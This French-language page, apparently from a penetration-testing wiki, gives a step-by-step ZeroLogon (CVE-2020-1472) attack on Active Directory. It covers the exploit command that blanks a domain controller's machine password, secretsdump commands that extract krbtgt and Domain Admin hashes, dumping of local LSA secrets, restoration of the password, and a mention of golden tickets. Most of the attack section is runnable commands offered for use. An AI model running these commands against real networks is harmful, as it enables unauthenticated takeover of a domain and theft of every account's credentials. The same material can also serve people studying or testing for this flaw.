---
order: 13
title: "ZeroLogon : réinitialiser le compte du contrôleur de domaine via Netlogon"
description: "Exploiter la faille cryptographique de Netlogon pour s'authentifier auprès d'un contrôleur de domaine en tant que son propre compte machine sans identifiant et réinitialiser le mot de passe de ce compte à une valeur vide, puis dumper le domaine et restaurer le mot de passe pour éviter de casser le DC."
keywords:
  - ZeroLogon
  - Netlogon
  - NetrServerPasswordSet2
  - compte machine du DC
  - prise de contrôle du domaine
---

# ZeroLogon

ZeroLogon est une faille du protocole de canal sécurisé **Netlogon** (MS-NRPC) : sa mise en place de session utilise AES-CFB8 avec un **IV entièrement nul**, de sorte qu'un attaquant non authentifié qui envoie des données de challenge entièrement nulles a de fortes chances d'établir une session Netlogon « valide » en tant que **n'importe quel compte machine**, y compris celui d'un **contrôleur de domaine**. À partir de là, `NetrServerPasswordSet2` réinitialise le mot de passe du compte machine de ce DC **dans l'annuaire** à une valeur vide, vous remettant l'identité du DC et, par elle, l'ensemble du domaine. C'est non authentifié, à distance, et cela ne nécessite qu'un accès réseau à un DC.

## L'attaque

```bash
# 1. Reset the target DC's machine-account password in AD to empty
#    (the public exploit sets DC$'s AD password to an empty string)
cve-2020-1472-exploit.py <DC-netbios-name> <dc-ip>

# 2. DCSync as the DC machine account (now empty) to recover a Domain Admin hash
secretsdump.py -just-dc -no-pass 'EXAMPLE/DC01$@<dc-ip>'
# -> krbtgt and every domain hash, including a Domain Admin NT hash
```

```bash
# NetExec only DETECTS the flaw (reports VULNERABLE); it does not perform the reset
nxc smb <dc> -u '' -p '' -M zerologon
```

## Restaurez le mot de passe, sinon vous cassez le domaine

La réinitialisation change le mot de passe **dans AD uniquement** ; le DC conserve encore son mot de passe d'origine dans son registre local (`$MACHINE.ACC` / secrets LSA), les deux sont donc désormais en désaccord. Laissé ainsi, le DC ne peut plus s'authentifier et le domaine se casse. Le DCSync ci-dessus lit **AD**, où le mot de passe est déjà vide, il ne vous donne donc **pas** la valeur d'origine. Récupérez-la depuis les secrets **locaux** du DC, puis remettez-la en place :

```bash
# 3. With the recovered Domain Admin hash, dump the DC's LOCAL secrets
#    (the local registry still holds the original machine password)
secretsdump.py 'EXAMPLE/Administrator@<dc-ip>' -hashes :<domain-admin-nt-hash>
#    -> read plain_password_hex ($MACHINE.ACC) from the local LSA secrets output

# 4. Restore the original password (restorepassword.py appends the trailing $ itself,
#    so the account name is DC01, not DC01$)
restorepassword.py 'EXAMPLE/DC01@<DC-netbios>' -target-ip <dc-ip> -hexpass <plain_password_hex>
```

## Notes d'exploitation

- Le gain est une **compromission immédiate du domaine** sans aucun identifiant, ce qui explique la gravité de ZeroLogon ; un DC corrigé impose le RPC sécurisé et rejette la session entièrement nulle.
- **Restaurez toujours** : sauter la restauration exclut le DC du domaine, ce qui est à la fois destructeur et un échec bruyant. La valeur d'origine provient du dump des secrets **locaux** du DC (étape 3), pas du DCSync sur AD, récupérez-la donc avant d'en avoir besoin.
- La variante de dirkjanm **relaie** l'authentification Netlogon au lieu de réinitialiser le mot de passe, évitant entièrement la réinitialisation destructrice, préférez-la lorsqu'elle est disponible pour rester non destructeur.
- Après le dump, utilisez les hashs [NTDS](ntds-and-dcsync.md) récupérés (krbtgt pour les golden tickets, administrateurs pour un accès direct) plutôt que de compter sur le mot de passe vide du DC, que vous aurez restauré.

## Outils

- **cve-2020-1472 exploit / zerologon_tester** (SecuraBV, dirkjanm) : vérifier et poser le mot de passe vide.
- **Impacket** (`secretsdump.py -no-pass`, `restorepassword.py`) : DCSync en tant que DC$ et restaurer le mot de passe.
- **NetExec `-M zerologon`** : détecter la faille (signale vulnérable ; ne réinitialise pas le mot de passe).

## Références

- [The Hacker Recipes: ZeroLogon](https://www.thehacker.recipes/ad/movement/netlogon/zerologon)
- [dirkjanm: a different way of abusing ZeroLogon](https://dirkjanm.io/a-different-way-of-abusing-zerologon/)
- [Semperis: ZeroLogon explained](https://www.semperis.com/blog/zerologon-explained/)
